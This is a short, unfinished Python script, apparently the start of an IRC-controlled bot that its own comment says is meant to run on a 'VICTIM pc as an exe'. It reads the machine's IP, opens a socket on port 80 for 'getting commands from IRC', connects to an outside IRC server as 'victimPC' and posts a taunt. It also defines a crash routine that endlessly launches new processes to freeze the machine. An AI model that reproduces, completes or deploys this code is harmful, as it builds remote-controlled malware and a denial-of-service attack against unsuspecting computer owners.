import socket 
import os
from requests import *
import irc.client

#This file would be run on a VICTIM pc as an exe

#grabbing private and public ip to show 
private_ip = socket.gethostbyname(socket.gethostname())
#public_ip = get('https://api.ipify.org').text

#create socket object for getting commands from IRC
s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
s.bind(('', 80))


def main():
	print 'started'
	reactor = irc.client.Reactor()
	server = reactor.server()
	server.connect(<ip to IRC server goes here>, 6667, 'victimPC')
	server.privmsg('#general', 'rekt')
	reactor.process_forever()



#crash
def crash():
  while True:
    os.system('start')


if __name__ == '__main__':
	main()